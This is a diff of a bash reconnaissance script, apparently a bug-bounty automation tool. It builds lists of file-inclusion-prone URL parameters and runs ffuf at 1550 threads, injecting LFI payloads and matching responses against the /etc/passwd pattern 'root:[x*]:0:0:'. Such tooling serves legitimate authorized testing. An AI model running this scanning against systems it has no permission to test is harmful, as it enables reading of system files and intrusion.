@@ -447,12 +447,12 @@ custompathlist(){
     sort -u $customSqliQueryList -o $customSqliQueryList
 
     echo "[$(date | awk '{ print $4}')] Prepare custom customLfiQueryList"
-    # 1 limited to lfi pattern
     # rabbit hole
     # grep -oiaE "(([[:alnum:][:punct:]]+)+)?(cat|dir|source|attach|cmd|action|board|detail|location|file|download|path|folder|prefix|include|inc|locate|site|show|doc|view|content|con|document|layout|mod|root|pg|style|template|php_path|admin)=" $customSsrfQueryList > $customLfiQueryList || true
-    grep -oiaE "(([[:alnum:][:punct:]]+)+)?(cat|dir|doc|source|attach|cmd|location|file|download|path|include|content|document|root|php_path|admin)=" $customSsrfQueryList > $customLfiQueryList || true
+    # 1 limited to lfi pattern
+    grep -oiaE "(([[:alnum:][:punct:]]+)+)?(cat|dir|doc|attach|cmd|location|file|download|path|include|document|root|php_path|admin|debug|log)=" $customSsrfQueryList | qsreplace -a > $customLfiQueryList || true
     # 2 limited to [:alnum:]=file.ext pattern
-    grep -oiaE "(([[:alnum:][:punct:]]+)+)?=(([[:alnum:][:punct:]]+)+)\.(pdf|txt|log|md|php|css|json|js|csv|src|old|jsp|sql|zip|xls|dll)" $queryList | grep -oiaE "(([[:alnum:][:punct:]]+)+)?=" >> $customLfiQueryList || true
+    grep -oiaE "(([[:alnum:][:punct:]]+)+)?=(([[:alnum:][:punct:]]+)+)\.(pdf|txt|log|md|php|json|csv|src|bak|old|jsp|sql|zip|xls|dll)" $queryList | grep -oiaE "(([[:alnum:][:punct:]]+)+)?=" | qsreplace -a  >> $customLfiQueryList || true
     sort -u $customLfiQueryList -o $customLfiQueryList
 
     < $customSsrfQueryList unfurl format '%p%?%q' | sed "/^\/\;/d;/^\/\:/d;/^\/\'/d;/^\/\,/d;/^\/\./d" | qsreplace -a > $TARGETDIR/ssrf-path-list.txt
@@ -538,15 +538,7 @@ lfitest(){
       ENDPOINTCOUNT=$(< $LFIPAYLOAD wc -l)
       echo "HOSTCOUNT=$HOSTCOUNT \t ENDPOINTCOUNT=$ENDPOINTCOUNT"
       echo $(($HOSTCOUNT*$ENDPOINTCOUNT))
-    # 1 rabbit hole:
-        # ffuf -timeout 7 -t 550 -u HOSTPATH \
-        #      -w $TARGETDIR/lfi-list.txt:HOST \
-        #      -w $LFIPAYLOAD:PATH \
-        #      -mr "root:[x*]:0:0:" \
-        #      -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Safari/537.36" \
-        #      -o $TARGETDIR/ffuf/lfi-matched-url.txt > /dev/null
-    # 2 real life:
-        ffuf -timeout 5 -t 550 -u HOSTPATH \
+        ffuf -timeout 5 -t 1550 -u HOSTPATH \
              -w $customLfiQueryList:HOST \
              -w $LFIPAYLOAD:PATH \
              -mr "root:[x*]:0:0:" \
